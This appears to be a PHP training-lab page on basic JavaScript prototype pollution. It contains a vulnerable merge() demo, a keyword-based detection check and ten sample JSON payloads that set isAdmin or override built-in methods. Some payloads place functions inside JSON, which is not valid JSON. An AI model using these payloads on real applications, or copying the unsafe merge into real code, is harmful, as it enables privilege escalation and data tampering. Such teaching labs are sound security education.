<?php
// Lab 1: Basic Prototype Pollution
// Vulnerability: Basic prototype pollution attacks

session_start();

$message = '';
$result = '';

// Simulate prototype pollution processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['input'] ?? '';
    
    // Simulate vulnerable JSON processing
    if (!empty($input)) {
        // This simulates a vulnerable JavaScript-like environment
        $result = "Processing input: " . htmlspecialchars($input);
        
        // Simulate prototype pollution detection
        if (strpos($input, '__proto__') !== false || strpos($input, 'constructor') !== false || strpos($input, 'prototype') !== false) {
            $message = '<div class="alert alert-danger">⚠️ Prototype Pollution detected! Input contains dangerous prototype properties.</div>';
        } else {
            $message = '<div class="alert alert-success">✅ Input processed successfully (no prototype pollution detected).</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic Prototype Pollution - Prototype Pollution Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .pollution-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-container {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-output {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 1rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Prototype Pollution Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Prototype Pollution</h1>
            <p class="hero-subtitle">Basic prototype pollution attacks</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates basic prototype pollution vulnerabilities where attackers can modify the prototype of base objects in JavaScript, leading to security issues like data manipulation and authentication bypass.</p>
            <p><strong>Objective:</strong> Understand how basic prototype pollution attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Application
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>JSON Configuration Parser</h5>
                            <p>This application processes JSON configuration data. Try to exploit prototype pollution vulnerabilities:</p>
                            
                            <form method="POST">
                                <div class="mb-3">
                                    <label for="input" class="form-label">JSON Input</label>
                                    <textarea class="form-control" id="input" name="input" rows="8" placeholder='{"name": "test", "value": "data"}'><?php echo isset($_POST['input']) ? htmlspecialchars($_POST['input']) : ''; ?></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">Process JSON</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Prototype Pollution Tester
                    </div>
                    <div class="card-body">
                        <div class="pollution-warning">
                            <h5>⚠️ Prototype Pollution Warning</h5>
                            <p>This lab demonstrates basic prototype pollution vulnerabilities:</p>
                            <ul>
                                <li><code>__proto__</code> - Direct prototype access</li>
                                <li><code>constructor</code> - Constructor property access</li>
                                <li><code>prototype</code> - Prototype property access</li>
                                <li><code>No validation</code> - Missing input validation</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Vulnerable Properties</h5>
                            <p>These properties can be exploited for prototype pollution:</p>
                            <ul>
                                <li><code>__proto__</code> - Direct prototype access</li>
                                <li><code>constructor</code> - Constructor property access</li>
                                <li><code>prototype</code> - Prototype property access</li>
                                <li><code>constructor.prototype</code> - Nested prototype access</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testPrototypePollution()" class="btn btn-primary">Test Prototype Pollution</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Prototype Pollution Demo
                    </div>
                    <div class="card-body">
                        <div class="demo-container">
                            <h5>JavaScript Prototype Pollution Demonstration:</h5>
                            <p>This demonstrates how prototype pollution works in JavaScript:</p>
                            
                            <div class="demo-output">
// Vulnerable function that doesn't validate input
function merge(target, source) {
    for (let key in source) {
        if (source.hasOwnProperty(key)) {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker input
const maliciousInput = {
    "__proto__": {
        "isAdmin": true,
        "role": "admin"
    }
};

// Vulnerable object
const user = { name: "john" };

// Pollution occurs here
merge(user, maliciousInput);

// Now all objects have polluted prototype
console.log({}.isAdmin); // true
console.log({}.role); // "admin"
                            </div>
                            
                            <div class="mt-3">
                                <small class="text-muted">The demo above shows how prototype pollution can affect all objects in the application.</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Processing Results
                    </div>
                    <div class="card-body">
                        <div class="result-display">
                            <h5>Processing Results:</h5>
                            <div id="processing-results"><?php echo $result ? $result : 'No input processed yet'; ?></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Basic Prototype Pollution</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Direct prototype access</li>
                        <li><strong>Issue:</strong> Missing input validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>__proto__ Access:</strong> Direct prototype modification</li>
                        <li><strong>Constructor Access:</strong> Constructor property manipulation</li>
                        <li><strong>Prototype Access:</strong> Prototype property manipulation</li>
                        <li><strong>Nested Access:</strong> Deep prototype manipulation</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Basic Prototype Pollution Examples</h5>
            <p>Use these techniques to exploit basic prototype pollution vulnerabilities:</p>
            
            <h6>1. Basic __proto__ Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "permissions": ["read", "write", "delete"]
  }
}</div>

            <h6>2. Constructor Pollution:</h6>
            <div class="code-block">{
  "constructor": {
    "prototype": {
      "isAdmin": true,
      "role": "admin"
    }
  }
}</div>

            <h6>3. Nested Prototype Pollution:</h6>
            <div class="code-block">{
  "constructor": {
    "prototype": {
      "constructor": {
        "prototype": {
          "isAdmin": true
        }
      }
    }
  }
}</div>

            <h6>4. Array Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "push": function() { return "hacked"; },
    "length": 999
  }
}</div>

            <h6>5. Function Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { return "hacked"; },
    "valueOf": function() { return 0; }
  }
}</div>

            <h6>6. Object Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "hasOwnProperty": function() { return true; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>7. Date Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "getTime": function() { return 0; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>8. String Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "charAt": function() { return "hacked"; },
    "length": 999
  }
}</div>

            <h6>9. Number Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "valueOf": function() { return 0; },
    "toString": function() { return "hacked"; }
  }
}</div>

            <h6>10. Boolean Prototype Pollution:</h6>
            <div class="code-block">{
  "__proto__": {
    "valueOf": function() { return true; },
    "toString": function() { return "hacked"; }
  }
}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Authentication bypass and privilege escalation</li>
                <li>Data manipulation and corruption</li>
                <li>Application logic bypass</li>
                <li>Denial of Service (DoS) attacks</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Validate input to prevent prototype pollution</li>
                    <li>Use Object.create(null) for safe objects</li>
                    <li>Implement proper input sanitization</li>
                    <li>Use Object.freeze() to prevent modifications</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual object behavior</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Educate developers about prototype pollution</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testPrototypePollution() {
            document.getElementById('processing-results').innerHTML = 
                '<div class="alert alert-info">Prototype Pollution test initiated. Try the payload examples above.</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
